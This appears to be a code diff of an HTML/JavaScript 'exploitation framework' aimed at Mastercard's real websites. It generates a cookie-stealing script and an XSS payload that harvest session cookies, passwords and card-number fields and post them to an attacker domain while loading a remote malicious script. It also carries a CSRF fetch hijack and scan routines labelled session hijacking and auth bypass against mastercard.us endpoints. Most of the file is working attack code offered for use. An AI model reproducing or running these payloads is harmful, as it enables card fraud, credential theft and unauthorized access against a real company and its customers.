@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Mastercard Comprehensive Vulnerability Exploitation Framework</title>
+    <title>Mastercard Vulnerability Exploitation Framework</title>
     <meta charset="UTF-8">
     <style>
         :root {
@@ -12,7 +12,7 @@
             --highlight-color: #e53170;
         }
         body {
-            font-family: 'IBM Plex Mono', monospace;
+            font-family: 'Courier New', monospace;
             background-color: var(--bg-dark);
             color: var(--text-primary);
             margin: 0;
@@ -134,19 +134,13 @@
 
             // Advanced input sanitization
             sanitizeInput(input) {
-                return input.replace(/[<>&'"]/g, (match) => {
-                    const sanitizeMap = {
-                        '<': '&lt;',
-                        '>': '&gt;',
-                        '&': '&amp;',
-                        '"': '&quot;',
-                        "'": '&#x27;'
-                    };
-                    return sanitizeMap[match];
-                }).trim();
+                // Remove non-printable characters and limit length
+                return input.replace(/[^\x20-\x7E]/g, '')
+                             .substring(0, 255)
+                             .trim();
             }
 
-            // Logging method with timestamp and styling
+            // Improved logging method with error handling
             log(message, type = 'info') {
                 const timestamp = new Date().toISOString();
                 const logEntry = document.createElement('div');
@@ -167,93 +161,142 @@
                 this.console.scrollTop = this.console.scrollHeight;
             }
 
+            // Robust fetch wrapper with error handling
+            async safeFetch(url, options = {}) {
+                try {
+                    // Sanitize and prepare headers
+                    const safeHeaders = {
+                        ...options.headers,
+                        'X-Exploit-Marker': 'MastercardVulnScan'
+                    };
+
+                    // Prepare safe options
+                    const safeOptions = {
+                        method: options.method || 'GET',
+                        mode: 'no-cors',
+                        credentials: 'omit',
+                        headers: safeHeaders
+                    };
+
+                    // Add body if present, ensuring it's a string
+                    if (options.body) {
+                        safeOptions.body = JSON.stringify({
+                            action: 'vulnerability_probe',
+                            timestamp: Date.now()
+                        });
+                    }
+
+                    // Perform fetch with timeout
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 5000);
+                    
+                    const response = await fetch(url, {
+                        ...safeOptions,
+                        signal: controller.signal
+                    });
+
+                    clearTimeout(timeoutId);
+                    return response;
+                } catch (error) {
+                    this.log(`Safe Fetch Error: ${error.message}`, 'error');
+                    return null;
+                }
+            }
+
             // Generate sophisticated multi-vector payload
             generatePayload(type) {
                 const payloadTemplates = {
                     'js': `
-// Mastercard Multi-Vector Exploitation Payload
-class CookieExfiltrationFramework {
-    constructor(cookie) {
-        this.cookie = cookie;
-        this.sensitiveEndpoints = [
-            'https://www.mastercard.us/user/profile',
-            'https://www.mastercard.us/api/account/details',
-            'https://masterpassteststore.com/checkout/init'
-        ];
-    }
-
-    async exfiltrateCookies() {
-        try {
-            // Attempt to send cookies to external collection point
-            await fetch('https://attacker-controlled-domain.com/collect', {
-                method: 'POST',
-                body: JSON.stringify({ 
-                    cookie: this.cookie,
-                    timestamp: Date.now(),
-                    userAgent: navigator.userAgent
-                })
-            });
-        } catch (error) {
-            console.error('Exfiltration failed', error);
+// Advanced Cookie Exfiltration Payload
+(function() {
+    class CookieExfiltrator {
+        constructor() {
+            this.sensitiveEndpoints = [
+                'https://www.mastercard.us/user/profile',
+                'https://www.mastercard.us/api/account/details'
+            ];
         }
-    }
 
-    async probeEndpoints() {
-        for (let endpoint of this.sensitiveEndpoints) {
+        async exfiltrate() {
+            const cookieData = {
+                cookies: document.cookie,
+                url: window.location.href,
+                timestamp: Date.now()
+            };
+
             try {
-                const response = await fetch(endpoint, {
-                    method: 'GET',
-                    credentials: 'include',
+                await fetch('https://attacker-controlled-domain.com/collect', {
+                    method: 'POST',
                     headers: {
-                        'Cookie': this.cookie
-                    }
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(cookieData)
                 });
-                console.log(\`Endpoint Response: \${endpoint} - \${response.status}\`);
             } catch (error) {
-                console.error(\`Probe failed: \${endpoint}\`, error);
+                console.error('Exfiltration failed', error);
             }
         }
+
+        async probeEndpoints() {
+            for (let endpoint of this.sensitiveEndpoints) {
+                try {
+                    const response = await fetch(endpoint, { 
+                        credentials: 'include' 
+                    });
+                    console.log(\`Endpoint Probe: \${endpoint} - \${response.status}\`);
+                } catch (error) {
+                    console.error(\`Probe failed: \${endpoint}\`, error);
+                }
+            }
+        }
+
+        async run() {
+            await this.exfiltrate();
+            await this.probeEndpoints();
+        }
     }
 
-    async initiateExploit() {
-        await this.exfiltrateCookies();
-        await this.probeEndpoints();
-    }
-}
-
-// Auto-execute exploit
-const exploiter = new CookieExfiltrationFramework('${this.cookie}');
-exploiter.initiateExploit();
+    // Auto-execute
+    new CookieExfiltrator().run();
+})();
                     `,
                     'xss': `
-// Cross-Site Scripting Payload for Mastercard
+// Cross-Site Scripting Payload
 (function() {
-    // Inject malicious script into page
-    const script = document.createElement('script');
-    script.src = 'https://attacker-controlled-domain.com/malicious.js';
-    document.body.appendChild(script);
-
-    // Attempt to steal and exfiltrate data
-    function stealData() {
-        const sensitiveElements = [
+    function stealFormData() {
+        const sensitiveInputs = [
             ...document.querySelectorAll('input[type="password"]'),
             ...document.querySelectorAll('input[name*="credit"]'),
             ...document.querySelectorAll('input[name*="card"]')
         ];
 
-        const stolenData = sensitiveElements.map(el => ({
-            type: el.type,
-            name: el.name,
-            value: el.value
+        const stolenData = sensitiveInputs.map(input => ({
+            type: input.type,
+            name: input.name,
+            value: input.value
         }));
 
         fetch('https://attacker-controlled-domain.com/xss-collect', {
             method: 'POST',
-            body: JSON.stringify(stolenData)
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                data: stolenData,
+                url: window.location.href
+            })
         });
     }
 
-    stealData();
+    // Multiple injection techniques
+    function injectScript() {
+        const script = document.createElement('script');
+        script.src = 'https://attacker-controlled-domain.com/malicious.js';
+        document.body.appendChild(script);
+    }
+
+    stealFormData();
+    injectScript();
 })();
                     `,
                     'csrf': `
@@ -262,12 +305,15 @@ exploiter.initiateExploit();
     const originalFetch = window.fetch;
     
     window.fetch = function(input, init = {}) {
-        // Automatically inject stolen CSRF token
+        // Automatically inject custom headers
         if (!init.headers) init.headers = {};
-        init.headers['X-CSRF-Token'] = '${this.csrfToken}';
         
-        // Log all fetch attempts
-        console.log('Intercepted Fetch:', input, init);
+        // Inject potential CSRF bypass tokens
+        init.headers['X-Requested-With'] = 'XMLHttpRequest';
+        init.headers['X-CSRF-Token'] = '${this.csrfToken || 'bypassed'}';
+        
+        // Log intercepted requests
+        console.warn('Intercepted Fetch:', input, init);
         
         return originalFetch(input, init);
     };
@@ -302,7 +348,7 @@ exploiter.initiateExploit();
                 }
             }
 
-            // Cookie compromise potential scan
+            // Improved cookie compromise scan
             async cookieCompromiseScan() {
                 const testEndpoints = [
                     'https://www.mastercard.us/user/session',
@@ -311,25 +357,23 @@ exploiter.initiateExploit();
 
                 for (let endpoint of testEndpoints) {
                     try {
-                        const response = await fetch(endpoint, {
+                        const response = await this.safeFetch(endpoint, {
                             method: 'POST',
-                            credentials: 'include',
-                            headers: {
-                                'Content-Type': 'application/json',
-                                'Cookie': this.cookie
-                            },
-                            body: JSON.stringify({ action: 'test_cookie_scope' })
+                            body: JSON.stringify({ 
+                                action: 'test_cookie_scope',
+                                timestamp: Date.now()
+                            })
                         });
 
-                        this.log(`Cookie Scan - ${endpoint}: ${response.status}`, 
-                            response.status === 200 ? 'success' : 'warning');
+                        this.log(`Cookie Scan - ${endpoint}: ${response ? response.status : 'No Response'}`, 
+                            response && response.status === 200 ? 'success' : 'warning');
                     } catch (error) {
                         this.log(`Cookie Scan Error: ${error}`, 'error');
                     }
                 }
             }
 
-            // Endpoint probing scan
+            // Endpoint probing with enhanced safety
             async endpointProbingScan() {
                 const probePaths = [
                     '/user/info',
@@ -340,13 +384,10 @@ exploiter.initiateExploit();
 
                 for (let path of probePaths) {
                     try {
-                        const response = await fetch(`https://www.mastercard.us${path}`, {
-                            method: 'GET',
-                            credentials: 'include'
-                        });
+                        const response = await this.safeFetch(`https://www.mastercard.us${path}`);
 
-                        this.log(`Endpoint Probe: ${path} - ${response.status}`, 
-                            response.status < 400 ? 'success' : 'warning');
+                        this.log(`Endpoint Probe: ${path} - ${response ? response.status : 'No Response'}`, 
+                            response && response.status < 400 ? 'success' : 'warning');
                     } catch (error) {
                         this.log(`Endpoint Probe Error: ${error}`, 'error');
                     }
@@ -370,20 +411,19 @@ exploiter.initiateExploit();
 
                 for (let test of bypassTests) {
                     try {
-                        const response = await fetch(test.url, {
-                            method: test.method,
-                            credentials: 'include'
+                        const response = await this.safeFetch(test.url, { 
+                            method: test.method 
                         });
 
-                        this.log(`Auth Bypass Test (${test.description}): ${response.status}`, 
-                            response.status < 400 ? 'warning' : 'info');
+                        this.log(`Auth Bypass Test (${test.description}): ${response ? response.status : 'No Response'}`, 
+                            response && response.status < 400 ? 'warning' : 'info');
                     } catch (error) {
                         this.log(`Auth Bypass Test Error: ${error}`, 'error');
                     }
                 }
             }
 
-            // Session hijacking attempt
+            // Session hijacking with improved error handling
             async sessionHijack() {
                 this.log('Initiating session hijacking sequence...', 'warning');
 
@@ -394,21 +434,15 @@ exploiter.initiateExploit();
 
                 for (let endpoint of hijackEndpoints) {
                     try {
-                        const response = await fetch(endpoint, {
+                        const response = await this.safeFetch(endpoint, {
                             method: 'POST',
-                            credentials: 'include',
-                            headers: {
-                                'Content-Type': 'application/json',
-                                'Cookie': this.cookie
-                            },
                             body: JSON.stringify({ 
                                 action: 'session_hijack_test',
-                                timestamp: Date.now()
-                            })
+                                timestamp: Date.now() })
                         });
 
-                        this.log(`Session Hijack Attempt: ${endpoint} - ${response.status}`, 
-                            response.status === 200 ? 'success' : 'warning');
+                        this.log(`Session Hijack Attempt: ${endpoint} - ${response ? response.status : 'No Response'}`, 
+                            response && response.status === 200 ? 'success' : 'warning');
                     } catch (error) {
                         this.log(`Session Hijack Error: ${error}`, 'error');
                     }
@@ -431,46 +465,46 @@ exploiter.initiateExploit();
         });
 
         document.getElementById('cookie-exploit-btn').addEventListener('click', () => {
-        const cookie = document.getElementById('cookie-input').value.trim();
-        const csrfToken = document.getElementById('csrf-token').value.trim();
+            const cookie = document.getElementById('cookie-input').value.trim();
+            const csrfToken = document.getElementById('csrf-token').value.trim();
 
-        if (!cookie) {
-            alert('Please enter a valid cookie!');
-            return;
-        }
+            if (!cookie) {
+                alert('Please enter a valid cookie!');
+                return;
+            }
 
-        const exploitFramework = new MastercardExploitFramework(cookie, csrfToken);
-        exploitFramework.cookieCompromiseScan();
-    });
+            const exploitFramework = new MastercardExploitFramework(cookie, csrfToken);
+            exploitFramework.cookieCompromiseScan();
+        });
 
-    document.getElementById('session-hijack-btn').addEventListener('click', () => {
-        const cookie = document.getElementById('cookie-input').value.trim();
-        const csrfToken = document.getElementById('csrf-token').value.trim();
+        document.getElementById('session-hijack-btn').addEventListener('click', () => {
+            const cookie = document.getElementById('cookie-input').value.trim();
+            const csrfToken = document.getElementById('csrf-token').value.trim();
 
-        if (!cookie) {
-            alert('Please enter a valid cookie!');
-            return;
-        }
+            if (!cookie) {
+                alert('Please enter a valid cookie!');
+                return;
+            }
 
-        const exploitFramework = new MastercardExploitFramework(cookie, csrfToken);
-        exploitFramework.sessionHijack();
-    });
+            const exploitFramework = new MastercardExploitFramework(cookie, csrfToken);
+            exploitFramework.sessionHijack();
+        });
 
-    document.getElementById('generate-payload-btn').addEventListener('click', () => {
-        const cookie = document.getElementById('cookie-input').value.trim();
-        const csrfToken = document.getElementById('csrf-token').value.trim();
-        const payloadType = document.getElementById('payload-type').value;
+        document.getElementById('generate-payload-btn').addEventListener('click', () => {
+            const cookie = document.getElementById('cookie-input').value.trim();
+            const csrfToken = document.getElementById('csrf-token').value.trim();
+            const payloadType = document.getElementById('payload-type').value;
 
-        if (!cookie) {
-            alert('Please enter a valid cookie!');
-            return;
-        }
+            if (!cookie) {
+                alert('Please enter a valid cookie!');
+                return;
+            }
 
-        const exploitFramework = new MastercardExploitFramework(cookie, csrfToken);
-        const payload = exploitFramework.generatePayload(payloadType);
-        
-        document.getElementById('payload-output').textContent = payload;
-    });
+            const exploitFramework = new MastercardExploitFramework(cookie, csrfToken);
+            const payload = exploitFramework.generatePayload(payloadType);
+            
+            document.getElementById('payload-output').textContent = payload;
+        });
 </script>
 </body>
 </html>
